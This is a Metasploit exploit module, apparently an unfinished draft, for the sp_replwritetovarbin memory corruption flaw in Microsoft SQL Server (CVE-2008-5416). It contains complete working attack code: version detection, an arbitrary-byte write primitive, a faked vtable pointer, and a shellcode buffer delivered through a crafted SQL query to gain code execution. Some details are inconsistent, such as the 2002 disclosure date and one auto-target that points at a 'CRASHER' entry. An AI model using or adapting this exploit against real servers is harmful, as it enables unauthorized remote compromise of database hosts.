##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::MSSQL
	def initialize(info = {})

		super(update_info(info,
			'Name'           => 'Microsoft SQL Server sp_replwritetovarbin Memory Corruption',
			'Description'    => %q{
					TODO:
				write description
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '50589' ],
					[ 'CVE', '2008-5416' ],
					[ 'BID', '32710' ],
					[ 'MSB', 'MS09-004' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/7501' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'seh',
				},
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Privileged'     => true,
			'Targets'        =>
				[
					# auto targeting!
					[ 'Automatic', { } ],

					#
					# Individual targets
					#
					[
						'MSSQL 2000 / MSDE',
						{
							'Writable' => 0x42b6cfe0,
							'Ret'      => 0x42b6be7b
						},
					],

					[
						'CRASHER',
						{
							'Writable' => 0xcafebabe,
							'Ret'      => 0xdeadbeef
						},
					]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Aug 5 2002'
			))
	end

	def check
		info = mssql_ping
		if (info and info.has_key?('Version'))
			
			# TODO: better detection
			if (info['Version'] =~ /8\.00\.194/)
				return Exploit::CheckCode::Vulnerable
			end
			
			# dump the discovered info and return that we detected MSSQL
			info.each_pair { |k,v|
				print_status("   #{k + (" " * (15-k.length))} = #{v}")
			}
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit

		mytarget = nil
		if target.name =~ /Automatic/
			print_status("Attempting automatic target detection...")
			info = mssql_ping
			if (info and info.has_key?('Version'))
				if (info['Version'] =~ /8\.00\./)
					mytarget = targets[1]
				elsif (info['Version'] =~ /9\.00\./)
					mytarget = targets[2]
				end
			end
			  
			if mytarget.nil?
				raise RuntimeError, "Unable to automatically detect the target"
			else
				print_status("Automatically detected target \"#{mytarget.name}\" from version \"#{info['Version']}\"")
			end
		else
			mytarget = target
		end

		# prepare a known address pointing to jmp ecx!
		if not write4(mytarget['Ret'], mytarget['Writable'])
			raise RuntimeError, "Unable to write a byte!"
		end

		if (not mssql_login_datastore)
			raise RuntimeError, "Invalid SQL Server credentials"
		end

		# trigger the call [eax+0x38]
		print_status("Triggering the call to our faked vtable ptr @ %#x" % mytarget['Writable'])
		sqlquery = %Q|declare @buf NVARCHAR(4000);
SET @buf='declare @eo int,@vb varbinary,@vbl int;
exec master.dbo.sp_replwritetovarbin 16,@eo output,@vb output,@vbl output,''%STUFF%'',''30'',''31'',''32'',''33'',''34'',''35'',''36'',''37'',''38'';
';
EXEC master..sp_executesql @buf;
|
		# make sploit buff
		num = 16
		sz = num + 179
		sploit = make_nops(sz-2)
		sploit << "\xeb\x04"
		sploit << [mytarget['Writable'] + 8].pack('V')
		sploit << payload.encoded
		sploit[3,4] = [mytarget['Writable']-0x38].pack('V')

		# encode chars that get modified
		enc = mssql_encode_string(sploit)
		sqlquery.gsub!(/%STUFF%/, enc)
		mssql_query(sqlquery, false)

		handler
		disconnect
	end

	# write a single byte value to an arbitrary address (using this vuln)
	def write1(byte, addr)
		if (not mssql_login_datastore)
			raise RuntimeError, "Invalid SQL Server credentials"
		end
		print_status("Writing 0x%02x to %#x ..." % [byte, addr])

		num = 16
		sz = num + 179

		buf = rand_text_alphanumeric(sz)
		# this corresponds to mov [eax+4], ecx
		buf << [addr - 4].pack('V')

		extra = rand_text_alphanumeric((0x100 - 0xe1) + byte)

		write_byte_sql = %Q|declare @eo int,@vb varbinary,@vbl int;exec master.dbo.sp_replwritetovarbin %NUM%,@eo output,@vb output,@vbl output,'%STUFF%','%EXTRA%';|
		sql = write_byte_sql.gsub(/%NUM%/, num.to_s).gsub(/%STUFF%/, buf).gsub(/%EXTRA%/, extra)
		ret = mssql_query(sql, false)

		disconnect
		return ret
	end

	# repeatedly write1 !
	def write4(dword, addr)
		arr = [dword].pack('V').unpack('C*')
		x = 0
		arr.each do |byte|
			return false if not write1(byte, addr+x)
			x += 1
		end
		return true
	end

	def mssql_encode_string(str)
		badchars = "\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f"

		enc = ""
		in_str = true
		str.unpack('C*').each do |ch|
			# double-double single quotes
			if ch == 0x27
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 4
				next
			end

			# double backslashes
			if ch == 0x5c
				if not in_str
					enc << "+'"
					in_str = true
				end
				enc << ch.chr * 2
				next
			end

			# convert any bad stuff to char(0xXX)
			if ((idx = badchars.index(ch.chr)))
				enc << "'" if in_str
				enc << "+char(0x%x)" % ch
				in_str = false
			else
				enc << "+'" if not in_str
				enc << ch.chr
				in_str = true
			end
		end
		enc << "+'" if not in_str
		return enc
	end

end
